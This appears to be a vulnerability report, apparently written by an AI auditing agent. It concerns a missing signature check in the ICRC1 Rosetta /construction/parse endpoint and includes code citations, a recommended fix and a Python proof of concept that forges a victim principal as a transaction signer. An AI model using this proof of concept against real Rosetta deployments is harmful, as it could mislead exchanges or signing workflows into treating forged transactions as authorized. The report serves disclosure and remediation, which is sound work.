The code path is fully traceable. Let me confirm the `Envelope` struct fields to complete the analysis.

### Title
Missing Signature Verification in `handle_construction_parse` Allows Forging `account_identifier_signers` — (`rs/rosetta-api/icrc1/src/construction_api/utils.rs`)

---

### Summary

The ICRC1 Rosetta `POST /construction/parse` endpoint with `signed=true` populates `account_identifier_signers` directly from the `sender` field of the submitted CBOR envelope content, without performing any cryptographic verification that the accompanying `sender_sig` is a valid signature over that content. An unprivileged attacker can craft a `SignedTransaction` CBOR with an arbitrary victim principal as `sender` and random bytes as `sender_sig`, submit it, and receive a response claiming the victim's account is a signer — with no valid signature ever produced.

---

### Finding Description

The call chain is:

```
POST /construction/parse
  → endpoints::construction_parse          (endpoints.rs:109)
  → services::construction_parse           (services.rs:196)
  → utils::handle_construction_parse       (utils.rs:469)
```

**Step 1 — Deserialization discards authentication material.**

In `services::construction_parse`, when `transaction_is_signed=true`, the `SignedTransaction` is deserialized from CBOR and only `envelope.content` is extracted; `sender_pubkey` and `sender_sig` are silently dropped: [1](#0-0) 

The `Envelope` struct carries `sender_pubkey`, `sender_sig`, and `sender_delegation` alongside `content`, but only `content` is forwarded downstream. No verification of `sender_sig` against `sender_pubkey` over the request ID of `content` is performed at any point.

**Step 2 — `handle_construction_parse` blindly trusts `envelope_content.sender()`.**

The function reads the `sender` field from the deserialized `EnvelopeContent` and, because `transaction_is_signed=true`, unconditionally pushes it into `account_identifier_signers`: [2](#0-1) 

There is no call to any signature verification routine anywhere between CBOR deserialization and this push. A grep for `verify.*sig`, `sig.*verify`, `validate.*sig` across the entire `rs/rosetta-api/icrc1/` tree returns zero hits in production code paths.

**Step 3 — `build_envelope_from_signature_and_envelope_content` shows the correct pattern is known but unused here.**

The `construction_combine` path correctly assembles envelopes with `sender_pubkey` and `sender_sig`: [3](#0-2) 

Yet the parse path never checks whether those fields are cryptographically consistent with the `sender` in `content`.

---

### Impact Explanation

The `account_identifier_signers` field in `ConstructionParseResponse` is the Rosetta-spec mechanism by which downstream systems determine which accounts have authorized a transaction: [4](#0-3) 

Exchange integrations and multi-party signing coordinators that call `/construction/parse` before broadcasting — to confirm all required parties have signed — will receive a forged affirmative response. The attacker never needs to possess the victim's private key. The Rosetta server is publicly accessible with no authentication on the endpoint: [5](#0-4) 

Note: the IC protocol itself will reject the transaction at submission time if the signature is invalid. The vulnerability is scoped to the Rosetta API layer — it enables fraud in workflows where the parse response is treated as proof of authorization prior to on-chain confirmation (e.g., multi-party release gates, exchange crediting logic, off-chain settlement systems).

---

### Likelihood Explanation

- Requires no privileges, no keys, no network position — only the ability to POST to the public Rosetta HTTP endpoint.
- The crafted CBOR is trivial to construct: set `Envelope.content.sender` to any principal bytes, set `sender_sig` to any non-empty byte sequence.
- The bug is deterministic and locally testable without any IC node.
- Likelihood is **high** for any deployment where downstream systems consume `account_identifier_signers` as an authorization signal before on-chain finality.

---

### Recommendation

Before populating `account_identifier_signers`, verify that `sender_sig` is a valid signature by `sender_pubkey` over `envelope_content.to_request_id().signable()`, and that `sender_pubkey` hashes to the `sender` principal in `envelope_content`. The `build_signable_payload` helper already computes the correct signable bytes: [6](#0-5) 

Retain `sender_pubkey` and `sender_sig` through the parse path (currently discarded at `services.rs:210`) and perform cryptographic verification before the push at `utils.rs:535–539`.

---

### Proof of Concept

```python
import cbor2, requests, hashlib

# Victim principal bytes (any valid principal)
victim_principal = bytes.fromhex("0000000000000000000000000000000000000000000000000000000000000001")

# Craft a minimal EnvelopeContent::Call with sender = victim
envelope_content = {
    "request_type": "call",
    "canister_id": bytes(29),          # any canister id
    "method_name": "icrc1_transfer",
    "arg": b"\x44\x49\x44\x4c\x00\x00",  # minimal candid
    "ingress_expiry": 9999999999999999999,
    "sender": victim_principal,
}

# Craft Envelope with random sender_sig
envelope = {
    "content": envelope_content,
    "sender_pubkey": b"\x00" * 44,     # garbage pubkey
    "sender_sig": b"\xff" * 64,        # random signature
}

signed_tx = {"envelopes": [envelope]}
cbor_hex = cbor2.dumps(signed_tx).hex()

resp = requests.post("http://<rosetta-host>/construction/parse", json={
    "network_identifier": {"blockchain": "Internet Computer", "network": "<ledger-id>"},
    "signed": True,
    "transaction": cbor_hex,
})

# Assert: response contains victim account in account_identifier_signers
# despite no valid signature ever being produced
print(resp.json()["account_identifier_signers"])
```

The response will contain the victim's `AccountIdentifier` in `account_identifier_signers` with no cryptographic verification having occurred.

### Citations

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L201-212)
```rust
    let (ingress_expiry_start, ingress_expiry_end, envelope_contents) = if transaction_is_signed {
        let signed_transaction = SignedTransaction::from_str(&transaction_string)
            .map_err(|err| Error::parsing_unsuccessful(&err))?;
        (
            signed_transaction.get_lowest_ingress_expiry(),
            signed_transaction.get_highest_ingress_expiry(),
            signed_transaction
                .envelopes
                .into_iter()
                .map(|envelope| envelope.content.into_owned())
                .collect(),
        )
```

**File:** rs/rosetta-api/icrc1/src/construction_api/utils.rs (L35-38)
```rust
// The Request id is linked to the EnvelopeContent and is the actual content of the request to the IC that needs to be signed to authenticate the caller
fn build_signable_payload(envelope_content: &EnvelopeContent) -> String {
    hex::encode(envelope_content.to_request_id().signable())
}
```

**File:** rs/rosetta-api/icrc1/src/construction_api/utils.rs (L40-51)
```rust
fn build_envelope_from_signature_and_envelope_content<'a>(
    signature: &Signature,
    envelope_content: EnvelopeContent,
) -> anyhow::Result<Envelope<'a>> {
    let envelope = Envelope {
        content: Cow::Owned(envelope_content),
        sender_pubkey: Some(signature.public_key.get_der_encoding()?),
        sender_sig: Some(hex::decode(&signature.hex_bytes)?),
        sender_delegation: None,
    };
    Ok(envelope)
}
```

**File:** rs/rosetta-api/icrc1/src/construction_api/utils.rs (L530-539)
```rust
            let caller = Account::from(*envelope_content.sender()).into();
            construction_parse_response
                .operations
                .extend(rosetta_core_operations);

            if transaction_is_signed {
                construction_parse_response
                    .account_identifier_signers
                    .get_or_insert_with(Default::default)
                    .push(caller);
```

**File:** rs/rosetta-api/common/rosetta_core/src/response_types.rs (L270-278)
```rust
pub struct ConstructionParseResponse {
    pub operations: Vec<Operation>,

    #[serde(skip_serializing_if = "Option::is_none")]
    pub account_identifier_signers: Option<Vec<AccountIdentifier>>,

    #[serde(skip_serializing_if = "Option::is_none")]
    pub metadata: Option<ObjectMap>,
}
```

**File:** rs/rosetta-api/icrc1/src/construction_api/endpoints.rs (L109-119)
```rust
pub async fn construction_parse(
    State(state): State<Arc<MultiTokenAppState>>,
    Json(request): Json<ConstructionParseRequest>,
) -> Result<Json<ConstructionParseResponse>> {
    let state = get_state_from_network_id(&request.network_identifier, &state)
        .map_err(|err| Error::invalid_network_id(&err))?;
    Ok(Json(services::construction_parse(
        request.transaction,
        request.signed,
        state.metadata.clone().into(),
    )?))
```
